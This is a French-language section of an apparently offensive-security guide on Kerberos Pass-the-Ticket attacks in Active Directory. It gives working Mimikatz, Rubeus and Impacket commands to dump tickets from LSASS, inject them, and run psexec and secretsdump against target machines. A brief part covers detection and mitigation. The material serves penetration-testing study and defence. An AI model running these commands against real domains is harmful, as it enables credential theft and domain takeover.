# VI.B. Pass-the-Ticket (PtT)

Pass-the-Ticket (PtT) est une technique de post-exploitation où un attaquant utilise un ticket Kerberos (TGT ou TGS) volé ou forgé pour s'authentifier auprès de services ou de machines au nom de l'utilisateur associé à ce ticket. Cela permet d'accéder à des ressources sans connaître le mot de passe en clair de l'utilisateur.

## Prérequis
*   Obtention d'un ticket Kerberos valide. Les tickets peuvent être :
    *   Extraits de la mémoire LSASS d'une machine compromise (ex: TGT d'un admin de domaine).
    *   Obtenus via Overpass-the-Hash (voir [VI.A](./A-pass-the-hash.md)).
    *   Forgés (Golden Tickets, Silver Tickets - voir [VIII.C Attaques Kerberos Avancées](../08-domination-domaine/C-attaques-kerberos-avancees.md)).
    *   Interceptés (moins courant, mais possible dans certains scénarios de Man-in-the-Middle).

## Outils et Commandes

*   **Mimikatz (Windows) :**
    Mimikatz est l'outil de prédilection pour extraire et injecter des tickets.

    1.  **Extraction de Tickets :**
        ```
        privilege::debug
        sekurlsa::tickets /export
        # Les tickets sont exportés au format .kirbi dans le répertoire courant.
        # Identifier les tickets intéressants (ex: krbtgt, cifs/hostname, host/hostname).
        ```

    2.  **Injection de Tickets (Pass-the-Ticket) :**
        ```
        privilege::debug
        # Injecter un ticket spécifique depuis un fichier .kirbi
        kerberos::ptt <CHEMIN_VERS_LE_FICHIER_TICKET.kirbi>
        # Après injection, la session courante peut utiliser ce ticket.
        # Exemple :
        # klist (pour vérifier les tickets chargés)
        # dir \\<MACHINE_CIBLE_FQDN>\C$
        ```
        Si vous avez plusieurs tickets pour différents utilisateurs/services, vous pouvez les injecter et `klist` montrera la pile de tickets. Windows utilisera le ticket approprié.

*   **Rubeus (Windows) :**
    Rubeus est également très puissant pour manipuler les tickets Kerberos.

    1.  **Extraction de Tickets (Dump) :**
        ```powershell
        # Dumper les tickets de la session courante (ou de toutes les sessions si admin)
        Rubeus.exe dump /nowrap
        # Pour un LUID de session spécifique
        # Rubeus.exe dump /luid:<LUID> /nowrap
        # Les tickets sont affichés en Base64. Copier la partie Base64 du ticket souhaité.
        ```

    2.  **Injection de Tickets (Pass-the-Ticket) :**
        ```powershell
        # Injecter un ticket depuis sa représentation Base64
        Rubeus.exe ptt /ticket:<TICKET_EN_BASE64>
        # Exemple :
        # klist
        # dir \\<MACHINE_CIBLE_FQDN>\C$
        ```
        Rubeus peut aussi utiliser des fichiers `.kirbi` :
        ```powershell
        # Rubeus.exe ptt /ticket:C:\chemin\vers\ticket.kirbi
        ```

*   **Impacket (Linux - `ticketer.py` pour forger, `getST.py` pour demander des TGS, `psexec.py` etc. avec Kerberos) :**
    Si l'attaquant est sur une machine Linux et a obtenu un TGT (ex: via Overpass-the-Hash ou extraction), il peut configurer son client Kerberos pour l'utiliser.

    1.  **Configuration de Kerberos sur Linux :**
        *   S'assurer que `/etc/krb5.conf` est correctement configuré pour le domaine cible.
        *   Stocker le TGT (souvent au format .ccache) dans une variable d'environnement :
            ```bash
            export KRB5CCNAME=/chemin/vers/le/fichier.ccache
            ```
    2.  **Utilisation avec les outils Impacket :**
        Beaucoup d'outils Impacket supportent l'authentification Kerberos. Si `KRB5CCNAME` est défini et contient un TGT valide, ils l'utiliseront.
        ```bash
        # -k : Utiliser Kerberos
        # -no-pass : Ne pas demander de mot de passe (car on utilise le ticket)
        psexec.py <DOMAINE_FQDN>/<UTILISATEUR_DU_TICKET>@<MACHINE_CIBLE_FQDN> -k -no-pass
        secretsdump.py <DOMAINE_FQDN>/<UTILISATEUR_DU_TICKET>@<MACHINE_CIBLE_FQDN> -k -no-pass
        ```

## Scénarios Courants

*   **Utilisation d'un TGT d'Administrateur de Domaine :**
    Un TGT d'admin de domaine permet d'accéder à pratiquement n'importe quelle ressource du domaine. Après avoir injecté un tel TGT, l'attaquant peut :
    *   Accéder aux partages administratifs (`C$`, `ADMIN$`) sur n'importe quelle machine jointe au domaine.
    *   Utiliser `psexec`, `wmiexec`, WinRM pour exécuter des commandes sur d'autres machines.
    *   Effectuer un DCSync pour dumper tous les hashes du domaine.

*   **Utilisation d'un TGS pour un Service Spécifique :**
    Si un TGS pour un service (ex: `CIFS/serveur_fichier.domaine.local`) est volé, il peut être utilisé pour accéder à ce service spécifique.
    ```powershell
    # Avec Rubeus, après avoir injecté le TGS pour CIFS/serveur.domaine.local
    # dir \\serveur.domaine.local\partage
    ```

## Considérations
*   **Durée de Vie des Tickets :** Les tickets Kerberos ont une durée de vie limitée (configurable par GPO, par défaut 10 heures pour les TGTs). Les tickets volés ne seront valides que pendant leur durée de vie restante.
*   **Détection :**
    *   L'extraction de tickets depuis LSASS est souvent détectée par les EDRs.
    *   L'utilisation anormale de tickets (ex: un ticket d'un utilisateur A utilisé depuis une machine B où A ne se connecte jamais) peut être suspecte.
    *   Les Golden/Silver tickets ont des caractéristiques qui peuvent être détectées (voir section sur les attaques Kerberos avancées).
*   **Protection LSA (RunAsPPL) :** Peut rendre l'extraction de tickets plus difficile.

Pass-the-Ticket est une technique puissante, en particulier lorsqu'elle est combinée avec des attaques de forge de tickets comme les Golden Tickets. 